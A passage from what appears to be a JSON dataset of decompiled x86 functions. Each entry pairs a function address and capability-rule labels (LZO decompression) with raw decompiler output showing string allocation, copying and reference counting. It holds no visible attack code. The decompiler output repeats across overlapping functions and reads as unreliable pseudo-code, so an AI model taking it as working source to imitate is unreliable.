-2 + uStack228 * 2) = 0;\n        piVar5[8] = iStack176;\n        piVar5[9] = piStack172;\n        if (piStack160 != &stack0xffffff68) {\n            piStack232 = piStack160;\n            piStack236 = 0x4959c0;\n            fcn.004c2c30();\n        }\n        piStack232 = piVar6;\n        piStack236 = 0x4959cb;\n        (**(*piVar6 + 0x1c))();\n        uStack228 = piStack156 + 1;\n        piStack172 = piStack156;\n        if (uStack228 < 0x3fffffff) {\n            piStack220 = uStack228 * 2;\n            puStack224 = 0x4959ed;\n            iStack176 = piStack220;\n            iVar4 = fcn.004c2c50();\n            piStack212 = NULL;\n            piStack216 = piStack172;\n            puStack224 = 0x495a09;\n            piStack220 = iVar4;\n            fcn.00455930();\n            piVar5[10] = iVar4;\n            *(iVar4 + -2 + iStack176) = 0;\n            piVar5[0xb] = piStack172;\n            if (piStack160 != &stack0xffffff68) {\n                piStack232 = piStack160;\n                piStack236 = 0x495a31;\n                fcn.004c2c30();\n            }\n            piStack236 = 0x495a38;\n            iVar4 = (**(*piVar6 + 0x24))();\n            piVar5[0xd] = iVar4;\n            piStack236 = 0x495a42;\n            iVar4 = (**(*piVar6 + 0x28))();\n            piVar5[0xe] = iVar4;\n            return;\n        }\n        puStack224 = 0x495a5a;\n        piVar5 = fcn.004c33a0();\n    }\n    else {\n        puStack224 = 0x495a67;\n        fcn.004c33a0();\ncode_r0x00495a67:\n        puStack224 = 0x495a6c;\n        fcn.004c33a0();\n    }\n    if (piStack160 != &stack0xffffff68) {\n        piStack220 = piStack160;\n        puStack224 = 0x495a7e;\n        fcn.004c2c30();\n    }\n    puStack224 = 0x495a86;\n    piStack220 = piVar5;\n    fcn.0043a8e0();\n    iVar7 = iStack208;\n    piVar3 = piStack212;\n    piStack232 = piVar6;\n    iStack300 = 0x495aa6;\n    piStack236 = piVar5;\n    puStack224 = &stack0xffffff90;\n    uVar1 = (**(*piStack212 + 8))();\n    *(iVar7 + 0x12) = uVar1;\n    iStack300 = 0x495ab1;\n    uVar1 = (**(*piVar3 + 0xc))();\n    *(iVar7 + 0x14) = uVar1;\n    iStack300 = 0x495abc;\n    uVar2 = (**(*piVar3 + 0x20))();\n    *(iVar7 + 8) = 0;\n    *(iVar7 + 0x30) = uVar2;\n    *(iVar7 + 0x18) = 0;\n    *(iVar7 + 0x20) = 0;\n    *(iVar7 + 0x28) = 0;\n    *(iVar7 + 0x52) = 1;\n    piStack296 = piVar3;\n    iStack300 = 0x495aea;\n    (**(*piVar3 + 0x10))();\n    iVar4 = *(auStack253._1_4_ + -0xc);\n    iStack300 = iVar4 + 1;\n    uStack304 = 0x495afe;\n    iStack300 = fcn.004c2c50();\n    uStack292 = 0;\n    uStack304 = 0x495b18;\n    piStack296 = iVar4;\n    piStack268 = iStack300;\n    fcn.0044bff0();\n    *(iVar7 + 0xc) = iVar4;\n    *(piStack268 + iVar4) = 0;\n    *(iVar7 + 8) = piStack268;\n    if (*0x515a34 == 0) {\n        iVar4 = *(auStack253._1_4_ + -4);\n        *(auStack253._1_4_ + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar6 = auStack253._1_4_ + -4;\n        iVar4 = *piVar6;\n        *piVar6 = *piVar6 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack312 = &stack0xffffff03;\n        piStack316 = 0x495d20;\n        fcn.0048b610();\n    }\n    piStack316 = piVar3;\n    piStack320 = 0x495b54;\n    (**(*piVar3 + 0x14))();\n    piStack268 = *(auStack253._1_4_ + -0xc);\n    uVar8 = piStack268 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack320 = uVar8 * 2;\n        puStack324 = 0x495b7d;\n        iStack272 = piStack320;\n        piVar6 = fcn.004c2c50();\n        puStack312 = NULL;\n        piStack316 = piStack268;\n        puStack324 = 0x495b99;\n        piStack320 = piVar6;\n        fcn.0044b110();\n        *(iVar7 + 0x18) = piVar6;\n        *(piVar6 + iStack272 + -2) = 0;\n        *(iVar7 + 0x1c) = piStack268;\n        if (*0x515a34 == 0) {\n            iVar4 = *(auStack253._1_4_ + -4);\n            *(auStack253._1_4_ + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar6 = auStack253._1_4_ + -4;\n            iVar4 = *piVar6;\n            *piVar6 = *piVar6 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack332 = &stack0xffffff03;\n            piStack336 = 0x495d50;\n            fcn.00483750();\n        }\n        piStack336 = piVar3;\n        piStack340 = 0x495bdb;\n        (**(*piVar3 + 0x18))();\n        piStack268 = *(auStack253._1_4_ + -0xc);\n        uVar8 = piStack268 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x00495ddf;\n        iStack328 = 0x495c00;\n        puStack324 = uVar8 * 2;\n        puStack324 = fcn.004c2c50();\n        piStack316 = NULL;\n        piStack320 = piStack268;\n        iStack328 = 0x495c1f;\n        iStack272 = puStack324;\n        fcn.0044b110();\n        *(iStack272 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x515a34;\n        *(iVar7 + 0x20) = iStack272;\n        *(iVar7 + 0x24) = piStack268;\n        if (iVar4 == 0) {\n            iVar4 = *(auStack253._1_4_ + -4);\n            *(auStack253._1_4_ + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar6 = auStack253._1_4_ + -4;\n            iVar4 = *piVar6;\n            *piVar6 = *piVar6 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack336 = &stack0xffffff03;\n            piStack340 = 0x495d80;\n            fcn.00483750();\n        }\n        piStack340 = piVar3;\n        iStack344 = 0x495c61;\n        (**(*piVar3 + 0x1c))();\n        piStack268 = *(auStack253._1_4_ + -0xc);\n        uVar8 = piStack268 + 1;\n        if (uVar8 < 0x3fffffff) {\n            puStack324 = uVar8 * 2;\n            iStack328 = 0x495c8a;\n            iStack272 = puStack324;\n            iVar4 = fcn.004c2c50();\n            piStack316 = NULL;\n            piStack320 = piStack268;\n            iStack328 = 0x495ca6;\n            puStack324 = iVar4;\n            fcn.0044b110();\n            *(iVar7 + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack272) = 0;\n            iVar4 = *0x515a34;\n            *(iVar7 + 0x2c) = piStack268;\n            if (iVar4 == 0) {\n                iVar4 = *(auStack253._1_4_ + -4);\n                *(auStack253._1_4_ + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar6 = auStack253._1_4_ + -4;\n                iVar4 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack336 = &stack0xffffff03;\n                piStack340 = 0x495db0;\n                fcn.00483750();\n            }\n            iStack344 = 0x495ce5;\n            uVar2 = (**(*piVar3 + 0x24))();\n            *(iVar7 + 0x34) = uVar2;\n            iStack344 = 0x495cef;\n            uVar2 = (**(*piVar3 + 0x28))();\n            *(iVar7 + 0x38) = uVar2;\n            return;\n        }\n        iStack328 = 0x495df1;\n        fcn.004c33a0();\n    }\n    else {\n        puStack324 = 0x495dc5;\n        fcn.004c33a0();\n        piStack320 = &stack0xffffff03;\n        puStack324 = 0x495dd6;\n        fcn.0048b630();\n        puStack324 = iVar7;\n        iStack328 = 0x495ddf;\n        fcn.0043a8e0();\ncode_r0x00495ddf:\n        iStack328 = 0x495de4;\n        iVar7 = fcn.004c33a0();\n    }\n    puStack324 = &stack0xffffff03;\n    iStack328 = 0x495e02;\n    fcn.00483770();\n    puStack332 = 0x495e0b;\n    iStack328 = iVar7;\n    fcn.0043a8e0();\n    piVar5 = piStack316;\n    piVar6 = piStack320;\n    piStack340 = piVar3;\n    iStack344 = iVar7;\n    piStack336 = uVar8;\n    puStack332 = &stack0xffffff20;\n    uVar1 = (**(*piStack320 + 8))();\n    *(piVar5 + 0x12) = uVar1;\n    uVar1 = (**(*piVar6 + 0xc))();\n    *(piVar5 + 5) = uVar1;\n    iVar4 = (**(*piVar6 + 0x20))();\n    piVar5[2] = 0;\n    piVar5[0xc] = iVar4;\n    piVar5[6] = 0;\n    piVar5[8] = 0;\n    piVar5[10] = 0;\n    *(piVar5 + 0x52) = 1;\n    (**(*piVar6 + 0x10))(piVar6);\n    iVar4 = fcn.004c2c50(iStack376 + 1);\n    fcn.00454b80(iVar4, iStack376, 0);\n    piVar5[3] = iStack376;\n    *(iVar4 + iStack376) = 0;\n    piVar5[2] = iVar4;\n    if (puStack380 != &stack0xfffffe8c) {\n        fcn.004c2c30(puStack380);\n    }\n    (**(*piVar6 + 0x14))(piVar6);\n    if (iStack376 + 1U < 0x3fffffff) {\n        iVar4 = (iStack376 + 1U) * 2;\n        iVar7 = fcn.004c2c50(iVar4);\n        fcn.00455930(iVar7, iStack376, 0);\n        piVar5[6] = iVar7;\n        piVar5[7] = iStack376;\n        *(iVar7 + -2 + iVar4) = 0;\n        if (puStack380 != &stack0xfffffe8c) {\n            fcn.004c2c30(puStack380);\n        }\n        (**(*piVar6 + 0x18))(piVar6);\n        if (iStack376 + 1U < 0x3fffffff) {\n            iVar4 = (iStack376 + 1U) * 2;\n            iVar7 = fcn.004c2c50(iVar4);\n            fcn.00455930(iVar7, iStack376, 0);\n            *(iVar7 + -2 + iVar4) = 0;\n            piVar5[8] = iVar7;\n            piVar5[9] = iStack376;\n            if (puStack380 != &stack0xfffffe8c) {\n                fcn.004c2c30(puStack380);\n            }\n            (**(*piVar6 + 0x1c))(piVar6);\n            if (iStack376 + 1U < 0x3fffffff) {\n                iVar4 = (iStack376 + 1U) * 2;\n                iVar7 = fcn.004c2c50(iVar4);\n                fcn.00455930(iVar7, iStack376, 0);\n                piVar5[10] = iVar7;\n                *(iVar7 + -2 + iVar4) = 0;\n                piVar5[0xb] = iStack376;\n                if (puStack380 != &stack0xfffffe8c) {\n                    fcn.004c2c30(puStack380);\n                }\n                iVar4 = (**(*piVar6 + 0x24))();\n                piVar5[0xd] = iVar4;\n                iVar4 = (**(*piVar6 + 0x28))();\n                piVar5[0xe] = iVar4;\n                return;\n            }\n            piVar5 = fcn.004c33a0();\n            goto code_r0x0049604c;\n        }\n    }\n    else {\n        fcn.004c33a0();\n    }\n    fcn.004c33a0();\ncode_r0x0049604c:\n    if (puStack380 != &stack0xfffffe8c) {\n        fcn.004c2c30(puStack380);\n    }\n    fcn.0043a8e0(piVar5);\n    *extraout_ECX = 0x52c0a0;\n    fcn.004be620(extraout_ECX + 4);\n    *extraout_ECX = 0x52be00;\n    fcn.00490df0();\n    fcn.004c2c30(extraout_ECX);\n    return;\n}\n",
        "token_count": 7435
    },
    "00495830": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_4\n\nvoid __cdecl\nfcn.00495830(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint *extraout_ECX;\n    uint32_t uVar8;\n    int32_t *var_ch;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *puStack272;\n    int32_t iStack268;\n    uchar auStack264 [28];\n    int32_t iStack236;\n    int32_t *piStack232;\n    int32_t *piStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    int32_t iStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int32_t iStack204;\n    uint uStack196;\n    int32_t iStack192;\n    int32_t *piStack188;\n    uint var_30h_3;\n    uint var_2ch_4;\n    uint var_28h_3;\n    uint var_3ch_2;\n    int32_t iStack164;\n    int32_t *piStack160;\n    uint var_30h_2;\n    uint var_2ch_3;\n    uint var_28h_2;\n    int32_t iStack144;\n    int32_t iStack128;\n    int32_t *var_ch_3;\n    uint32_t var_10h_3;\n    uchar *puStack116;\n    int32_t *piStack112;\n    int32_t *piStack108;\n    int32_t *piStack104;\n    int32_t iStack100;\n    int32_t var_ch_2;\n    int32_t *var_10h_2;\n    uint uStack88;\n    int32_t var_40h;\n    int32_t *var_3ch_3;\n    int32_t *var_30h_4;\n    int32_t *var_2ch_2;\n    uint var_28h_4;\n    uint var_ch_4;\n    \n    var_ch_2 = 0x495846;\n    uVar2 = (**(*var_ch + 8))();\n    *(noname_2 + 0x12) = uVar2;\n    var_ch_2 = 0x495851;\n    uVar2 = (**(*var_ch + 0xc))();\n    *(noname_2 + 0x14) = uVar2;\n    var_ch_2 = 0x49585c;\n    uVar3 = (**(*var_ch + 0x20))();\n    *(noname_2 + 8) = 0;\n    *(noname_2 + 0x30) = uVar3;\n    *(noname_2 + 0x18) = 0;\n    *(noname_2 + 0x20) = 0;\n    *(noname_2 + 0x28) = 0;\n    *(noname_2 + 0x52) = 1;\n    var_10h_2 = var_ch;\n    var_ch_2 = 0x49588a;\n    (**(*var_ch + 0x10))();\n    piVar1 = var_2ch_2;\n    var_ch_2 = var_2ch_2 + 1;\n    iStack100 = 0x49589b;\n    var_ch_2 = fcn.004c2c50();\n    uStack88 = 0;\n    var_10h_2 = piVar1;\n    iStack100 = 0x4958b5;\n    var_3ch_3 = var_ch_2;\n    fcn.00454b80();\n    *(noname_2 + 0xc) = piVar1;\n    *(var_3ch_3 + piVar1) = 0;\n    *(noname_2 + 8) = var_3ch_3;\n    if (var_30h_4 != &fcn.00495830::var_28h_4) {\n        piStack108 = var_30h_4;\n        piStack112 = 0x4958d7;\n        fcn.004c2c30();\n    }\n    piStack108 = var_ch;\n    piStack112 = 0x4958e2;\n    (**(*var_ch + 0x14))();\n    var_10h_3 = var_2ch_2 + 1;\n    var_3ch_3 = var_2ch_2;\n    if (var_10h_3 < 0x3fffffff) {\n        piStack112 = var_10h_3 * 2;\n        puStack116 = 0x495908;\n        var_40h = piStack112;\n        iVar4 = fcn.004c2c50();\n        piStack104 = NULL;\n        piStack108 = var_3ch_3;\n        puStack116 = 0x495924;\n        piStack112 = iVar4;\n        fcn.00455930();\n        *(noname_2 + 0x18) = iVar4;\n        *(noname_2 + 0x1c) = var_3ch_3;\n        *(iVar4 + -2 + var_40h) = 0;\n        if (var_30h_4 != &fcn.00495830::var_28h_4) {\n            var_ch_3 = var_30h_4;\n            iStack128 = 0x49594c;\n            fcn.004c2c30();\n        }\n        var_ch_3 = var_ch;\n        iStack128 = 0x495957;\n        (**(*var_ch + 0x18))();\n        var_10h_3 = var_2ch_2 + 1;\n        var_3ch_3 = var_2ch_2;\n        if (0x3ffffffe < var_10h_3) goto code_r0x00495a67;\n        puStack116 = 0x495979;\n        piStack112 = var_10h_3 * 2;\n        piStack112 = fcn.004c2c50();\n        piStack104 = NULL;\n        piStack108 = var_3ch_3;\n        puStack116 = 0x495998;\n        var_40h = piStack112;\n        fcn.00455930();\n        *(var_40h + -2 + var_10h_3 * 2) = 0;\n        *(noname_2 + 0x20) = var_40h;\n        *(noname_2 + 0x24) = var_3ch_3;\n        if (var_30h_4 != &fcn.00495830::var_28h_4) {\n            var_ch_3 = var_30h_4;\n            iStack128 = 0x4959c0;\n            fcn.004c2c30();\n        }\n        var_ch_3 = var_ch;\n        iStack128 = 0x4959cb;\n        (**(*var_ch + 0x1c))();\n        var_10h_3 = var_2ch_2 + 1;\n        var_3ch_3 = var_2ch_2;\n        if (var_10h_3 < 0x3fffffff) {\n            piStack112 = var_10h_3 * 2;\n            puStack116 = 0x4959ed;\n            var_40h = piStack112;\n            iVar4 = fcn.004c2c50();\n            piStack104 = NULL;\n            piStack108 = var_3ch_3;\n            puStack116 = 0x495a09;\n            piStack112 = iVar4;\n            fcn.00455930();\n            *(noname_2 + 0x28) = iVar4;\n            *(iVar4 + -2 + var_40h) = 0;\n            *(noname_2 + 0x2c) = var_3ch_3;\n            if (var_30h_4 != &fcn.00495830::var_28h_4) {\n                var_ch_3 = var_30h_4;\n                iStack128 = 0x495a31;\n                fcn.004c2c30();\n            }\n            iStack128 = 0x495a38;\n            uVar3 = (**(*var_ch + 0x24))();\n            *(noname_2 + 0x34) = uVar3;\n            iStack128 = 0x495a42;\n            uVar3 = (**(*var_ch + 0x28))();\n            *(noname_2 + 0x38) = uVar3;\n            return;\n        }\n        puStack116 = 0x495a5a;\n        noname_2 = fcn.004c33a0();\n    }\n    else {\n        puStack116 = 0x495a67;\n        fcn.004c33a0();\ncode_r0x00495a67:\n        puStack116 = 0x495a6c;\n        fcn.004c33a0();\n    }\n    if (var_30h_4 != &fcn.00495830::var_28h_4) {\n        piStack112 = var_30h_4;\n        puStack116 = 0x495a7e;\n        fcn.004c2c30();\n    }\n    puStack116 = 0x495a86;\n    piStack112 = noname_2;\n    fcn.0043a8e0();\n    iVar6 = iStack100;\n    piVar1 = piStack104;\n    var_ch_3 = var_ch;\n    iStack192 = 0x495aa6;\n    iStack128 = noname_2;\n    puStack116 = &stack0xfffffffc;\n    uVar2 = (**(*piStack104 + 8))();\n    *(iVar6 + 0x12) = uVar2;\n    iStack192 = 0x495ab1;\n    uVar2 = (**(*piVar1 + 0xc))();\n    *(iVar6 + 0x14) = uVar2;\n    iStack192 = 0x495abc;\n    uVar3 = (**(*piVar1 + 0x20))();\n    *(iVar6 + 8) = 0;\n    *(iVar6 + 0x30) = uVar3;\n    *(iVar6 + 0x18) = 0;\n    *(iVar6 + 0x20) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x52) = 1;\n    piStack188 = piVar1;\n    iStack192 = 0x495aea;\n    (**(*piVar1 + 0x10))();\n    iVar4 = *(iStack144 + -0xc);\n    iStack192 = iVar4 + 1;\n    uStack196 = 0x495afe;\n    iStack192 = fcn.004c2c50();\n    var_30h_3 = 0;\n    uStack196 = 0x495b18;\n    piStack188 = iVar4;\n    piStack160 = iStack192;\n    fcn.0044bff0();\n    *(iVar6 + 0xc) = iVar4;\n    *(piStack160 + iVar4) = 0;\n    *(iVar6 + 8) = piStack160;\n    if (*0x515a34 == 0) {\n        iVar4 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar5 = iStack144 + -4;\n        iVar4 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack204 = &fcn.00495830::var_28h_2 + 3;\n        piStack208 = 0x495d20;\n        fcn.0048b610();\n    }\n    piStack208 = piVar1;\n    piStack212 = 0x495b54;\n    (**(*piVar1 + 0x14))();\n    piStack160 = *(iStack144 + -0xc);\n    uVar8 = piStack160 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack212 = uVar8 * 2;\n        iStack216 = 0x495b7d;\n        iStack164 = piStack212;\n        piVar5 = fcn.004c2c50();\n        iStack204 = 0;\n        piStack208 = piStack160;\n        iStack216 = 0x495b99;\n        piStack212 = piVar5;\n        fcn.0044b110();\n        *(iVar6 + 0x18) = piVar5;\n        *(piVar5 + iStack164 + -2) = 0;\n        *(iVar6 + 0x1c) = piStack160;\n        if (*0x515a34 == 0) {\n            iVar4 = *(iStack144 + -4);\n            *(iStack144 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar5 = iStack144 + -4;\n            iVar4 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack224 = &fcn.00495830::var_28h_2 + 3;\n            piStack228 = 0x495d50;\n            fcn.00483750();\n        }\n        piStack228 = piVar1;\n        piStack232 = 0x495bdb;\n        (**(*piVar1 + 0x18))();\n        piStack160 = *(iStack144 + -0xc);\n        uVar8 = piStack160 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x00495ddf;\n        iStack220 = 0x495c00;\n        iStack216 = uVar8 * 2;\n        iStack216 = fcn.004c2c50();\n        piStack208 = NULL;\n        piStack212 = piStack160;\n        iStack220 = 0x495c1f;\n        iStack164 = iStack216;\n        fcn.0044b110();\n        *(iStack164 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x515a34;\n        *(iVar6 + 0x20) = iStack164;\n        *(iVar6 + 0x24) = piStack160;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack144 + -4);\n            *(iStack144 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar5 = iStack144 + -4;\n            iVar4 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack228 = &fcn.00495830::var_28h_2 + 3;\n            piStack232 = 0x495d80;\n            fcn.00483750();\n        }\n        piStack232 = piVar1;\n        iStack236 = 0x495c61;\n        (**(*piVar1 + 0x1c))();\n        piStack160 = *(iStack144 + -0xc);\n        uVar8 = piStack160 + 1;\n        if (uVar8 < 0x3fffffff) {\n            iStack216 = uVar8 * 2;\n            iStack220 = 0x495c8a;\n            iStack164 = iStack216;\n            iVar4 = fcn.004c2c50();\n            piStack208 = NULL;\n            piStack212 = piStack160;\n            iStack220 = 0x495ca6;\n            iStack216 = iVar4;\n            fcn.0044b110();\n            *(iVar6 + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack164) = 0;\n            iVar4 = *0x515a34;\n            *(iVar6 + 0x2c) = piStack160;\n            if (iVar4 == 0) {\n                iVar4 = *(iStack144 + -4);\n                *(iStack144 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar5 = iStack144 + -4;\n                iVar4 = *piVar5;\n                *piVar5 = *piVar5 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack228 = &fcn.00495830::var_28h_2 + 3;\n                piStack232 = 0x495db0;\n                fcn.00483750();\n            }\n            iStack236 = 0x495ce5;\n            uVar3 = (**(*piVar1 + 0x24))();\n            *(iVar6 + 0x34) = uVar3;\n            iStack236 = 0x495cef;\n            uVar3 = (**(*piVar1 + 0x28))();\n            *(iVar6 + 0x38) = uVar3;\n            return;\n        }\n        iStack220 = 0x495df1;\n        fcn.004c33a0();\n    }\n    else {\n        iStack216 = 0x495dc5;\n        fcn.004c33a0();\n        piStack212 = &fcn.00495830::var_28h_2 + 3;\n        iStack216 = 0x495dd6;\n        fcn.0048b630();\n        iStack216 = iVar6;\n        iStack220 = 0x495ddf;\n        fcn.0043a8e0();\ncode_r0x00495ddf:\n        iStack220 = 0x495de4;\n        iVar6 = fcn.004c33a0();\n    }\n    iStack216 = &fcn.00495830::var_28h_2 + 3;\n    iStack220 = 0x495e02;\n    fcn.00483770();\n    puStack224 = 0x495e0b;\n    iStack220 = iVar6;\n    fcn.0043a8e0();\n    piVar7 = piStack208;\n    piVar5 = piStack212;\n    piStack232 = piVar1;\n    iStack236 = iVar6;\n    piStack228 = uVar8;\n    puStack224 = &stack0xffffff8c;\n    uVar2 = (**(*piStack212 + 8))();\n    *(piVar7 + 0x12) = uVar2;\n    uVar2 = (**(*piVar5 + 0xc))();\n    *(piVar7 + 5) = uVar2;\n    iVar4 = (**(*piVar5 + 0x20))();\n    piVar7[2] = 0;\n    piVar7[0xc] = iVar4;\n    piVar7[6] = 0;\n    piVar7[8] = 0;\n    piVar7[10] = 0;\n    *(piVar7 + 0x52) = 1;\n    (**(*piVar5 + 0x10))(piVar5);\n    iVar4 = fcn.004c2c50(iStack268 + 1);\n    fcn.00454b80(iVar4, iStack268, 0);\n    piVar7[3] = iStack268;\n    *(iVar4 + iStack268) = 0;\n    piVar7[2] = iVar4;\n    if (puStack272 != &stack0xfffffef8) {\n        fcn.004c2c30(puStack272);\n    }\n    (**(*piVar5 + 0x14))(piVar5);\n    if (iStack268 + 1U < 0x3fffffff) {\n        iVar4 = (iStack268 + 1U) * 2;\n        iVar6 = fcn.004c2c50(iVar4);\n        fcn.00455930(iVar6, iStack268, 0);\n        piVar7[6] = iVar6;\n        piVar7[7] = iStack268;\n        *(iVar6 + -2 + iVar4) = 0;\n        if (puStack272 != &stack0xfffffef8) {\n            fcn.004c2c30(puStack272);\n        }\n        (**(*piVar5 + 0x18))(piVar5);\n        if (iStack268 + 1U < 0x3fffffff) {\n            iVar4 = (iStack268 + 1U) * 2;\n            iVar6 = fcn.004c2c50(iVar4);\n            fcn.00455930(iVar6, iStack268, 0);\n            *(iVar6 + -2 + iVar4) = 0;\n            piVar7[8] = iVar6;\n            piVar7[9] = iStack268;\n            if (puStack272 != &stack0xfffffef8) {\n                fcn.004c2c30(puStack272);\n            }\n            (**(*piVar5 + 0x1c))(piVar5);\n            if (iStack268 + 1U < 0x3fffffff) {\n                iVar4 = (iStack268 + 1U) * 2;\n                iVar6 = fcn.004c2c50(iVar4);\n                fcn.00455930(iVar6, iStack268, 0);\n                piVar7[10] = iVar6;\n                *(iVar6 + -2 + iVar4) = 0;\n                piVar7[0xb] = iStack268;\n                if (puStack272 != &stack0xfffffef8) {\n                    fcn.004c2c30(puStack272);\n                }\n                iVar4 = (**(*piVar5 + 0x24))();\n                piVar7[0xd] = iVar4;\n                iVar4 = (**(*piVar5 + 0x28))();\n                piVar7[0xe] = iVar4;\n                return;\n            }\n            piVar7 = fcn.004c33a0();\n            goto code_r0x0049604c;\n        }\n    }\n    else {\n        fcn.004c33a0();\n    }\n    fcn.004c33a0();\ncode_r0x0049604c:\n    if (puStack272 != &stack0xfffffef8) {\n        fcn.004c2c30(puStack272);\n    }\n    fcn.0043a8e0(piVar7);\n    *extraout_ECX = 0x52c0a0;\n    fcn.004be620(extraout_ECX + 4);\n    *extraout_ECX = 0x52be00;\n    fcn.00490df0();\n    fcn.004c2c30(extraout_ECX);\n    return;\n}\n",
        "token_count": 5328
    },
    "00495a90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00495a90(uint param_1, int32_t *param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *extraout_ECX;\n    uint32_t uVar7;\n    int32_t *var_ch;\n    int32_t var_10h;\n    uint var_30h_3;\n    uint var_2ch_4;\n    uint var_1ch_3;\n    uint *puStack160;\n    int32_t var_30h_2;\n    uint var_2ch_3;\n    uint var_28h_2;\n    uint var_1ch_2;\n    int32_t var_ch_3;\n    int32_t *var_10h_3;\n    int32_t *piStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    uchar *var_10h_2;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack52;\n    int32_t *var_2ch_2;\n    uchar var_1dh;\n    int32_t var_1ch;\n    \n    iStack80 = 0x495aa6;\n    uVar1 = (**(*var_ch + 8))();\n    *(var_10h + 0x12) = uVar1;\n    iStack80 = 0x495ab1;\n    uVar1 = (**(*var_ch + 0xc))();\n    *(var_10h + 0x14) = uVar1;\n    iStack80 = 0x495abc;\n    uVar2 = (**(*var_ch + 0x20))();\n    *(var_10h + 8) = 0;\n    *(var_10h + 0x30) = uVar2;\n    *(var_10h + 0x18) = 0;\n    *(var_10h + 0x20) = 0;\n    *(var_10h + 0x28) = 0;\n    *(var_10h + 0x52) = 1;\n    piStack76 = var_ch;\n    iStack80 = 0x495aea;\n    (**(*var_ch + 0x10))();\n    iVar4 = *(var_1ch + -0xc);\n    iStack80 = iVar4 + 1;\n    uStack84 = 0x495afe;\n    iStack80 = fcn.004c2c50();\n    uStack72 = 0;\n    uStack84 = 0x495b18;\n    piStack76 = iVar4;\n    var_2ch_2 = iStack80;\n    fcn.0044bff0();\n    *(var_10h + 0xc) = iVar4;\n    *(var_2ch_2 + iVar4) = 0;\n    *(var_10h + 8) = var_2ch_2;\n    if (*0x515a34 == 0) {\n        iVar4 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_1ch + -4;\n        iVar4 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (iVar4 < 1) {\n        var_10h_2 = &stack0xffffffdf;\n        piStack96 = 0x495d20;\n        fcn.0048b610();\n    }\n    piStack96 = var_ch;\n    piStack100 = 0x495b54;\n    (**(*var_ch + 0x14))();\n    var_2ch_2 = *(var_1ch + -0xc);\n    uVar7 = var_2ch_2 + 1;\n    if (uVar7 < 0x3fffffff) {\n        piStack100 = uVar7 * 2;\n        puStack104 = 0x495b7d;\n        iStack52 = piStack100;\n        piVar3 = fcn.004c2c50();\n        var_10h_2 = NULL;\n        piStack96 = var_2ch_2;\n        puStack104 = 0x495b99;\n        piStack100 = piVar3;\n        fcn.0044b110();\n        *(var_10h + 0x18) = piVar3;\n        *(piVar3 + iStack52 + -2) = 0;\n        *(var_10h + 0x1c) = var_2ch_2;\n        if (*0x515a34 == 0) {\n            iVar4 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack112 = &stack0xffffffdf;\n            piStack116 = 0x495d50;\n            fcn.00483750();\n        }\n        piStack116 = var_ch;\n        var_10h_3 = 0x495bdb;\n        (**(*var_ch + 0x18))();\n        var_2ch_2 = *(var_1ch + -0xc);\n        uVar7 = var_2ch_2 + 1;\n        if (0x3ffffffe < uVar7) goto code_r0x00495ddf;\n        iStack108 = 0x495c00;\n        puStack104 = uVar7 * 2;\n        puStack104 = fcn.004c2c50();\n        piStack96 = 